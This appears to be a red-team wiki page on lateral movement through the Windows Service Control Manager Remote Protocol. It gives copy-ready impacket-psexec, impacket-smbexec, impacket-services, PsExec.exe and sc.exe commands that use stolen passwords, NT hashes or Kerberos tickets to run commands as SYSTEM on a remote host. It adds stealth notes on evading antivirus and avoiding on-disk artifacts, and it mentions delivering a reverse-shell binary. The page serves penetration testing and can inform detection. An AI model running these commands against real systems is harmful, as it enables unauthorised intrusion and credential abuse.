---
label: MS-SCMR
---

# MS-SCMR: Service Control Manager Remote Protocol

> **Typical requirements**
>
> * Credentials (password, NT hash, Kerberos TGT) of local administrator on target machine.
> * Read-write SMB share access.
> * Remote SCM enabled on the target machine (always by default).
> * SMB share enabled on the target machine (always by default).

## Description

Through the [MS-SCMR](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/705b624a-13de-43cc-b8a2-99573da3635f) (RPC) protocol, Windows allows remote communication with another machine's [Service Control Manager](https://learn.microsoft.com/pl-pl/windows/win32/services/service-control-manager) (SCM). This allows, among other things, remote startup of services. This capability ultimately allows the user to execute code on another machine (by creating a service), which is the basis for techniques like PsExec and SmbExec.

PsExec and SmbExec are well-known attacks designed to establish a pseudo-interactive "shell" on the target machine. Both attacks require access to SMB share of the target host (445/TCP).

It is worth remembering that remote service creation is a built-in feature of standard `sc.exe`. There is no magic here, it is a standard feature of Windows. Without SMB access, the service will execute, but we cannot provide a malicious binary to the service or receive a response. Most often, however, if remote execution of the service is possible, a read-write SMB share is also available (e.g. default `ADMIN$` or `C$` share).

By default, using service execution techniques a user needs to be a **local administrator** on the target machine to remotely interact with SCM via RPC. Windows services executed by the local administrator by default run in the context of **SYSTEM user**. Logon via MS-SCMR (RPC call) is of the **Network type** (no reusable credentials).

## PsExec

> **IMPORTANT**: A user who wants to use PsExec on a remote machine must have read-write access to at least one SMB share. Without remote SMB access, it is not possible to use PsExec.

Linux:

```bash
# Using password
impacket-psexec $domain/$user:$password@$host

# Using NT hash
impacket-psexec -hashes :$nt_hash $domain/$user@$host

# Using Kerberos TGT
export KRB5CCNAME=$tgt_ccache_file
impacket-psexec $domain/$user@$host -k -no-pass
```

Windows ([SysInternals - PsExec.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)):

```powershell
# Using password
.\PsExec.exe -accepteula -u $user -p $password \\$HOST cmd

# Using Kerberos TGT (in-memory)
.\PsExec.exe -accepteula -u $user \\$HOST cmd
```

PsExec works by writing an `.exe` binary to the writable SMB share on the target host. Then, SCM is called remotely (via RPC) to execute the binary using created service. Binary creates a named pipe accessible via SMB. This named pipe is used by the user to execute commands remotely and read the output. Two-way communication is established via SMB.

> **Caveats**:
>
> * A generic binary is often detected by AV.
> * PsExec leaves artifacts behind on SMB share that require manual cleaning. The uploaded binary is not automatically removed.

## SmbExec

Linux:

```bash
# Using password
impacket-smbexec $domain/$user:$password@$host

# Using NT hash
impacket-smbexec -hashes :$nt_hash $domain/$user@$host

# Using Kerberos TGT
export KRB5CCNAME=$tgt_ccache_file
impacket-smbexec $domain/$user@$host -k -no-pass

# Debug mode (shows every executed `binPath` command)
impacket-smbexec [...] -debug
```

Unlike PsExec, SmbExec doesn't transfer a detectable binary to the target host. Instead of using a malicious binary, SmbExec launches a new service (using SCM remotely via RPC) with each new command. It executes the command in the `binPath` parameter of the service and closes the service. It just executes each desired command as a new service. Output is read via SMB share. There is no leftover on disk.

SmbExec is stealthier alternative to noisy and easy to detect PsExec. Nevertheless, it is important to remember that an event log is created for every command executed (service creation).

> **Caveats**
>
> * Each command run by SmbExec is a separate service. Therefore, there is no real session. Loading modules in PowerShell makes no sense. You have to load and call the module in a single command.
> * There's no `cd` command. Again - there's no real session.

## Raw Service Execution (ScExe)

You can use the standard Windows tool `sc.exe` to run a service on a remote machine. It can be a single shell command or, for example, a reverse-shell binary sent over SMB.

Linux (`impacket-services` is basically a Linux port of native `sc.exe`):

```bash
# Using password
impacket-services $domain/$user:$password@$host [action]

# Using NT hash
impacket-services -hashes :$nt_hash $domain/$user@$host [action]

# Using Kerberos TGT
export KRB5CCNAME=$tgt_ccache_file
impacket-services $domain/$user@$host -k -no-pass [action]

# Actions
list -h
create -h
start -h
stop -h
delete -h
```

Windows:

> **IMPORTANT**: Watch out for spaces in arguments. They are necessary!

```powershell
# Create and start service
sc \\$host create $svc_name binPath= "cmd.exe /c $command" start= auto
sc \\$host start $svc_name

# Stop and delete service
sc \\$host stop $svc_name
sc \\$host delete $svc_name
```

<!-- TODO: How to provide credentials to `sc.exe`. -->

## References

* [Rift, _SMBExec: Red Side Analysis_](https://rift.stacktitan.com/smbexec/)
* [Boitatech, _SmbExec/ScExec_](https://hacktricks.boitatech.com.br/windows/ntlm/smbexec)
* [Ryan Hausknecht, _Offensive Lateral Movement_](https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f)